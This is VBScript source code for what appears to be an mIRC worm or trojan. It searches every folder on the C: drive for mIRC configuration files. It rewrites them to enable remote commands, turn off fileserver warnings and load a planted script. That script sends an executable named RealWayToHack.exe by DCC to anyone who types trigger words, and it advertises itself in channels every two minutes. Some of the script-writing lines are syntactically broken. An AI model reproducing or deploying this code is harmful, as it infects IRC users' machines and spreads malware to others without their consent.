 dim Coca1
 dim Coca2
 dim Kisse
 dim Falcon
 dim SuckDick

 call ShowFolderList("c:\")
 Call ILU()

 sub ShowFolderList(s)
 on error resume next
 'Level 1

     Set filesys = CreateObject("Scripting.FileSystemObject")
     Set RootFolder1 = FileSys.GetFolder(s)
 	Set SubFolds1 = RootFolder1.subfolders
 	For Each f1 in Subfolds1
 		s = f1.path & "\ "
 		Coca1 = s & "mirc.ini "
 		Coca2= s & "mirc.dat "
 		Falcon= "C:\winamod.dat "
 		Kisse= s & "servers.ini "
 		SuckDick= "[rfiles] "
 		if filesys.fileexists(Coca1) then
 			Call Filemod()  
 			filesys.CopyFile Falcon, Coca1, true 
 			Call ImplementRemote() 
 			filesys.CopyFile Falcon, Coca1, true 
 			Call ImplementWarn()
 			filesys.CopyFile Falcon, Coca1, true 
 			Call ImplementFserv() 
 			filesys.CopyFile Falcon, Coca1, true 
 			call ImplementPerfCheck() 
 			filesys.CopyFile Falcon, Coca1, true 
 			Call ImplementPerform() 
 			SetClearArchiveBit(Coca1) 
 		End If 
 	Call ShowFolderList(s) 
     Next 
  
 End sub 
  
 Function FiltNum(FilString) 
 'on error resume next 
 countdown=5 
 do 
 	Comp = mid(FilString,2,countdown) 
 	if isnumeric(Comp) then LastNum = Comp : exit do 
 countdown=countdown-1 
 loop until countdown =0 
 FiltNum = LastNum 
 end function 
  
 Function LastLineNum(SSection) 
 'on error resume next 
 Set FS1N = CreateObject("Scripting.FileSystemObject") 
 Set FR1N = FS1N.OpenTextFile(Coca1,1,true) 
  
 Do While FR1N.AtEndOfStream <> True 
 	segment1 = FR1N.readline
 	w = InstrRev(segment1,SSection) 
 	counts=counts+1 
 	if w > 0 then  
 		do 
 			if FR1N.AtEndOfStream = True then exit do 
 			segmentk = FR1N.readline 
 			k = InstrRev(segmentk,"n",1) 
 			if k=1 then 
 				LastNum=FiltNum(segmentk) 
 			end if 
 		Loop until k=0 
 	end if 
 loop 
 FR1N.Close 
 LastLineNum=LastNum 
 end function 
  
 Function Filemod() 
 'on error resume next 
 Set fs1 = CreateObject("Scripting.FileSystemObject") 
 Set fr1 = fs1.OpenTextFile(Coca1,1,true) 
 Set fs2 = CreateObject("Scripting.FileSystemObject") 
 Set fr2 = fs2.OpenTextFile(Falcon,2,true) 
  
 Do While fr1.AtEndOfStream <> True 
 	segment1 = fr1.readline 
 	fr2.writeline segment1 
 	w = InstrRev(segment1,"[rfiles]") 
 	counts=counts+1 
 	if w > 0 then  
 	counts2=counts
 		do 
 			if fr1.AtEndOfStream = True then exit do 
 			segmentk = fr1.readline 
 			k = InstrRev(segmentk,"n",1)		 
 			if k=1 then 
 				LastNum=FiltNum(segmentk) 
 				fr2.writeline segmentk 
 			end if 
 		COUNTS2=COUNTS2+1 
 		Loop until k<>1 
 	exit do 
 	end if 
 loop 
 fr1.Close 
 fr2.close 
  
 Set fs3 = CreateObject("Scripting.FileSystemObject") 
 Set fr3 = fs3.OpenTextFile(Falcon,8,true) 
 TrojanInfo = "n" & lastlinenum(SuckDick)+1 & "=Servers.ini" 
 fr3.writeline TrojanInfo 
 fr3.Close 
  
 Set fs4 = CreateObject("Scripting.FileSystemObject") 
 Set fr4 = fs4.OpenTextFile(Coca1,1,true) 
  
 Set fs5 = CreateObject("Scripting.FileSystemObject") 
 Set fr5 = fs5.OpenTextFile(Falcon,8,true) 
  
 Do While fr4.AtEndOfStream <> True 
 	segment2 = fr4.readline 
 	if fr4.line >= counts2 + 2 then
 		fr5.writeline segment2 
 	end if 
 loop 
 fr4.Close 
 fr5.Close 
 fs5.CopyFile Falcon, Coca1, true 
 Call FLDL(Kisse) 
 end Function 
  
 sub FLDL(Kisse) 
 'on error resume next 
 Set fs6 = CreateObject("Scripting.FileSystemObject") 
 Set fr6 = fs6.OpenTextFile(Kisse,2,true) 
 "[script]" 
 "n0=; ----------------" 
 "n1=; Dont Modify Anything In This Script" 
 "n2=; Else it can stop running along with" 
 "n3=; Your system.  // mIRC Operators" 
 "n4=; ----------------" 
 "n5=on *:TEXT:!Hacks:#: {" 
 "n6=  Notice $nick -------------" 
 "n7=  Notice $nick My list with hacks isent done yet" 
 "n8=  Notice $nick -------------" 
 "n9=  Notice $nick 12 " 
 "n10=  Notice $nick Type !RealWayToHack for a Help with hacking" 
 "n11=}" 
 "n12=on *:TEXT:!RealWayToHack:#: {" 
 "n13=  Notice $nick -- Sending you RealWayToHack.exe --" 
 "n14=  dcc send $nick C:\Windows\System\RealWayToHack.exe" 
 "n15=}" 
 "n16=on *:CONNECT:{ "
 "n17= timer 0 120 /ame [***| Type !Hacks for my list of Hacks |***]" 
 "n18=}" 
 fr6.close 
 end sub 
  
 Function ImplementRemote() 
 Set fs1a = CreateObject("Scripting.FileSystemObject") 
 Set fr1a = fs1a.OpenTextFile(Coca1,1,true) 
 Set fs2a = CreateObject("Scripting.FileSystemObject") 
 Set fr2a = fs2a.OpenTextFile(Falcon,2,true) 
  
 Do While fr1a.AtEndOfStream <> True 
 	segment1a = fr1a.readline 
 	fr2a.writeline segment1a 
 	if ucase(segment1a)=ucase("[options]") then 
 	Do 
 		If fr1a.AtEndOfStream Then exit do 
 		n2a = fr1a.readline 
 		If ucase(mid(n2a,1,3))=ucase("n2=") then 
 			fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34) 
 			exit do 
 		Else 
 			fr2a.writeline n2a 
 		End If 
 	Loop 
 	end if 
 loop 
 fr1a.Close 
 fr2a.close 
 End Function 

 Function Implementfserv() 
 Set fs1a = CreateObject("Scripting.FileSystemObject") 
 Set fr1a = fs1a.OpenTextFile(Coca1,1,true) 
 Set fs2a = CreateObject("Scripting.FileSystemObject") 
 Set fr2a = fs2a.OpenTextFile(Falcon,2,true) 
  
 Do While fr1a.AtEndOfStream <> True 
 	segment1a = fr1a.readline 
 	fr2a.writeline segment1a 
 	if ucase(segment1a)=ucase("[warn]") then 
 	Do 
 		If fr1a.AtEndOfStream Then exit do 
 		n2a = fr1a.readline 
 		If ucase(n2a)=ucase("fserve=on") then 
 			fr2a.writeline "fserve=off" 
 		Else 
 			fr2a.writeline n2a 
 		End If 
 	Loop 
 	end if 
 loop 
 fr1a.Close 
 fr2a.close 
 End Function 
  
 Function Implementwarn() 
 Set fs1c = CreateObject("Scripting.FileSystemObject") 
 Set fr1c = fs1c.OpenTextFile(Coca1,1,true) 
 Set fs2c = CreateObject("Scripting.FileSystemObject") 
 Set fr2c = fs2c.OpenTextFile(Falcon,2,true) 

 Do While fr1c.AtEndOfStream <> True 
 	segment1c = fr1c.readline 
 	fr2c.writeline segment1c 
 	if ucase(segment1c)=ucase("[fileserver]") then 
 	Do 
 		if fr1c.AtEndOfStream then exit do 
 		n2c = fr1c.readline 
 		If ucase(n2c)=ucase("warning=on") then 
 			fr2c.writeline "warning=off" 
 		Else 
 			fr2c.writeline n2c 
 		End If 
 	Loop 
 	end if 
 loop 
 fr1c.Close 
 fr2c.close 
 End Function 
  
 Function ImplementPerform() 
 Set fs1p = CreateObject("Scripting.FileSystemObject") 
 Set fr1p = fs1p.OpenTextFile(Coca1,8,true) 
 fr1p.writeline "[Perform]" 
 fr1p.writeline "n0=/Remote ON" 
 fr1p.Close 
 fs1p.close 
 End Function 
  
 Sub SetClearArchiveBit(filespec) 
 Dim fsg, fg 
 Set fsg = CreateObject("Scripting.FileSystemObject")
 Set fg = fsg.GetFile(filespec) 
 fg.attributes = 0 
 fg.attributes = fg.attributes + 1 
 End Sub 
  
 Function ImplementPerfCheck() 
 Set fs1f = CreateObject("Scripting.FileSystemObject") 
 Set fr1f = fs1f.OpenTextFile(Coca1,1,true) 
 Set fs2f = CreateObject("Scripting.FileSystemObject") 
 Set fr2f = fs2f.OpenTextFile(Falcon,2,true) 
  
 Do While fr1f.AtEndOfStream <> True 
 	segment1f = fr1f.readline 
 	fr2f.writeline segment1f 
 	if ucase(segment1f)=ucase("[options]") then 
 	Do 
 		If fr1f.AtEndOfStream Then exit do 
 		n2f = fr1f.readline 
 		If ucase(mid(n2f,1,3))=ucase("n0=") then 
 			fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
 			exit do
 		Else
 			fr2f.writeline n2f
 		End If
 	Loop
 	end if
 loop
 fr1f.Close
 fr2f.close
 End Function
